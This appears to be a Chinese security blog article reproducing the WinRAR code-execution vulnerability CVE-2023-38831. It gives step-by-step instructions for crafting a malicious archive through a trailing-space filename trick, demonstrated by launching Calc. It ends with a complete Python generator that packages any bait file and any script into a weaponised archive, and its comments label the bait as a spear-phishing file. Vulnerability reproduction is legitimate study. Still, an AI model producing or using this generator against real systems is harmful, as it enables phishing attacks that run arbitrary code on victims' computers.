> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ESdwRLUv28Evk5b0Q6v4Gg)

**WinRAR 代码执行漏洞 CVE-2023-38831 复现【附 exp】**
==========================================

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR12vO6cnnxN9Kw14pO6bx9GjKAH2bJzTMqVL89ciaDDqlkqb7BtdJlmIMH6rLGMyx8IFmo8Ox1Cv9Ew/640?wx_fmt=png)

WinRAR 是一款功能强大的压缩包管理器，它是档案工具 RAR 在 Windows 环境下的图形界面。该软件可用于备份数据，缩减电子邮件附件的大小，解压缩从 Internet 上下载的 RAR、ZIP 及其它类型文件，并且可以新建 RAR 及 ZIP 格式等的压缩类文件。

WinRAR 在处理压缩包内同名的文件与文件夹时存在代码执行漏洞。攻击者构建由恶意文件与非恶意文件构成的特制压缩包文件，诱导受害者打开此文件中看似无害的文件（如 JPG 文件）后，将在受害者机器上执行任意代码。

![](https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs4ibawvYy4vIW5LTxkh0od3a8thzba67srWU1YCMEr65oZW4LiaTSHa9oPrCQ29KENmY7K3RXZn7wb4g/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR12vO6cnnxN9Kw14pO6bx9GjplURiayhn1HOwd3z7p82pl3Pr6Eh07qBBickuCRtWVYticIZpRDdQbIZQ/640?wx_fmt=png)

首先利用两个压缩工具，一个是 7z，一个是 rar，7z 主要是用来创建测试漏洞文件

在文件夹中，创建两个文件

*   1 test （文件夹）
    
*   2 ReadMe.txt .cmd (批处理文件)
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR12vO6cnnxN9Kw14pO6bx9Gj4gmhKgmvZpQ8XLtgmEQOQr2dIwSLbaRXibYJhL1BR1yNogop4nvWwZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR12vO6cnnxN9Kw14pO6bx9Gjr9ltzrh5spHPfboialzOwEv1MXB2eDppqMVMY7rlDiaf94c68T2etQ9A/640?wx_fmt=png)

用 7z，压缩文件，右键把 test 文件夹压缩成 zip，然后在打开

新建一个名称为，ReadMe.txt 的文件和 ReadMe.txt 文件夹 (注意，文件是会有冲突的) 踩坑点，需要用 rar 和 7z 配合使用

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11icXEpdgDlMiaVq0CAIVszahWZehfvA05mcpzBg3zpQrcDcxiaThbVSSfZnQefnzQ6CdtgFiaTnlESmA/640?wx_fmt=png)

在 test 文件夹内再创建一个 test.txt 文件夹 (不在桌面创建是因为已经有了一个 test.txt 文本)，然后在 test.txt 文件夹中创建 "test.txt .cmd"，注意有空格哟。

这里可以创建 cmd 或者 bat 两种脚本文件。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11icXEpdgDlMiaVq0CAIVszahLsZftRudeKMdmNztR9uDx0icdXLQBg9jyptEehiaPXe0Uwzc2YpdvyzA/640?wx_fmt=png)

test.zip 压缩包需要用 7zip 打开，然后把 test.txt 文件夹拖入压缩包中，修改 test.txt 文件夹名称加一个空格 "test.txt "

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11icXEpdgDlMiaVq0CAIVszah9yOY2B7W1ht4EMRIHicZPXehdPG1qfM5ylZrjd0qHg8ntQaPoCHfMqQ/640?wx_fmt=png)

把桌面的 test.txt 也拖入 test.zip 压缩包中，也需要重命名为 "test.txt"

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11icXEpdgDlMiaVq0CAIVszahMZibgs0pqgRBdFIkHibBpOETKmxQHALXAuyBqPBLGr68atZdHVWn08lA/640?wx_fmt=png)

最后用压缩包打开，双击 "test.txt " 成功执行 "test.txt .cmd" 打开 Calc

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11icXEpdgDlMiaVq0CAIVszah9GQPVfAH5FP7fZRyA482Ps3eYXj5ehujx2NVy46o7pkptIB9OUh0xQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11icXEpdgDlMiaVq0CAIVszahgmZFA2QxXIrUUc8z5pr1Cvpw6ZrbRCv32LHs6UrnWHnAVOHf2mB07A/640?wx_fmt=png)

**利用代码**

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import shutil
import os
import sys
TEMPLATE_NAME = "TEMPLATE"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"
BAIT_NAME = "test.txt"
SCRIPT_NAME = "test.bat"
def main():
    global BAIT_NAME, SCRIPT_NAME, OUTPUT_NAME  # 声明为全局变量
    # 处理命令行参数
    if len(sys.argv) > 3:
        BAIT_NAME = os.path.basename(sys.argv[1])
        SCRIPT_NAME = os.path.basename(sys.argv[2])
        OUTPUT_NAME = os.path.basename(sys.argv[3])
    elif len(sys.argv) == 2 and sys.argv[1] == "poc":
        pass
    else:
        print("""用法：
              python cve-2023-38831-exp-gen.py poc
              python cve-2023-38831-exp-gen.py <BAIT_NAME> <SCRIPT_NAME> <OUTPUT_NAME>""")
        sys.exit()
    # 提取鱼叉文件名的扩展名
    BAIT_EXT = b"." + bytes(BAIT_NAME.split(".")[-1], "utf-8")
    print("鱼叉文件名:", BAIT_NAME)
    print("脚本文件名:", SCRIPT_NAME)
    print("输出文件名:", OUTPUT_NAME)
    # 清理并创建必要的目录
    if os.path.exists(TEMPLATE_NAME):
        shutil.rmtree(TEMPLATE_NAME)
    os.mkdir(TEMPLATE_NAME)
    d = os.path.join(TEMPLATE_NAME, BAIT_NAME + "A")
    if not os.path.exists(d):
        os.mkdir(d)
    # 复制文件到模板目录
    shutil.copyfile(SCRIPT_NAME, os.path.join(d, BAIT_NAME + "A.cmd"))
    shutil.copyfile(BAIT_NAME, os.path.join(TEMPLATE_NAME, BAIT_NAME + "B"))
    # 创建模板目录的 zip 压缩文件
    shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)
    # 读取、修改并写回 zip 压缩文件
    with open(TEMPLATE_NAME + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
        content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")
    os.remove(TEMPLATE_NAME + ".zip")
    # 将修改后的内容保存为最终输出文件
    with open(OUTPUT_NAME, "wb") as f:
        f.write(content)
    print("成功生成漏洞利用代码。")
if __name__ == "__main__":
    main()

```

> 参考：利刃信安